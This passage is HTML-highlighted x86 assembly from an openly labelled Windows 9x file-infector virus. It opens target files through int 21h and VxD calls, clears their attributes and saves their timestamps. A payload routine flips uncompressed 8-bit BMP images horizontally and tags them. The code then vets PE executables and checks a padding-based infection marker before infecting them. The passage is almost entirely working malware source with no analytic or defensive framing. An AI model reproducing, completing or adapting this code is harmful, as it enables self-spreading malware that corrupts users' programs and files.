                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_attrib</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;Save original attrib</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007143h</span><span class="sc0">                       </span><span class="sc1">;LFN Ext attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                              </span><span class="sc1">;Set file attributes</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;Clear all attributes</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00007143h</span><span class="sc0">                       </span><span class="sc1">;LFN Ext attributes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                              </span><span class="sc1">;Retrieve last w time</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_time</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">;Save original time</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_date</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">       </span><span class="sc1">;Save original date</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0000716Ch</span><span class="sc0">                       </span><span class="sc1">;LFN Ext Open/Create</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">                       </span><span class="sc1">;Read/Write</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;Attribute normal</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">00000001h</span><span class="sc0">                       </span><span class="sc1">;Open existing</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">target_filename</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Ptr to filename</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit_infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003F00h</span><span class="sc0">                       </span><span class="sc1">;Read MsDos header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0">         </span><span class="sc1">;or bitmap file</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">executable</span><span class="sc0">

                </span><span class="sc1">;Here comes the payload code... if it is activated the virus</span><span class="sc0">
                </span><span class="sc1">;will flip horizontally every .BMP file accessed, including</span><span class="sc0">
                </span><span class="sc1">;the ones hidden as .SYS (logow.sys for example ;)</span><span class="sc0">

                </span><span class="sc1">;Payload activated?</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_active</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc1">;Well, now lets try to determine if this file is a BMP file</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">],</span><span class="sc3">"MB"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc1">;Allow only .BMP files using 1 plane and 8 bits per pixel</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">0000001Ah</span><span class="sc4">],</span><span class="sc2">00080001h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc1">;Skip .BMP files that use compression</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">0000001Eh</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc1">;Check bitmap size in bytes</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000012h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000016h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000022h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000002h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000FFFh</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_pages</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;# of pages</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PR_SYSTEM</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc2">00010000h</span><span class="sc0">                          </span><span class="sc1">;Call to _PageReserve</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;VxDCall0</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0FFFFFFFFh</span><span class="sc0">                      </span><span class="sc1">;Success?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_address</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;Save linnear address</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PC_WRITEABLE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">PC_USER</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PD_ZEROINIT</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_pages</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;# of pages</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">                             </span><span class="sc1">;Linnear page number</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010001h</span><span class="sc0">                          </span><span class="sc1">;Call to _PageCommit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;VxDCall0</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">free_bmp_mem</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_bof</span><span class="sc0">                           </span><span class="sc1">;Return to bof</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003F00h</span><span class="sc0">                       </span><span class="sc1">;Read the whole .BMP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000002h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_address</span><span class="sc4">]</span><span class="sc0">     
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">                          
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">free_bmp_mem</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">0000000Ah</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0DEADBABEh</span><span class="sc0">          </span><span class="sc1">;Already flip'ed?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">free_bmp_mem</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000016h</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">height_loop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000012h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">00000001h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">width_loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">width_loop</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">height_loop</span><span class="sc0">     

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0DEADBABEh</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_bof</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">free_bmp_mem</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00004000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc2">00000002h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">

</span><span class="sc5">free_bmp_mem</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">bmp_address</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0001000Ah</span><span class="sc0">                          </span><span class="sc1">;Call to _PageFree</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">a_VxDCall</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;VxDCall0</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">executable</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">msdos_header</span><span class="sc4">+</span><span class="sc5">MZ_lfarlc</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">      
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_eof</span><span class="sc0">                           </span><span class="sc1">;Get file size</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SIZE_PADDING</span><span class="sc0">                    </span><span class="sc1">;Already infected?</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek2pe_header</span><span class="sc0">                     </span><span class="sc1">;Seek to PE header</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">                           </span><span class="sc1">;and read it </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003F00h</span><span class="sc0">                       </span><span class="sc1">;Read also following</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc0"> \     </span><span class="sc1">;optional header</span><span class="sc0">
                        </span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc4">+</span><span class="sc0"> \
                        </span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_signature</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">my_int21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_signature</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">+</span><span class="sc5">FH_Machine</span><span class="sc4">],</span><span class="sc0"> \
                        </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pe_header</span><span class="sc4">+</span><span class="sc5">FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

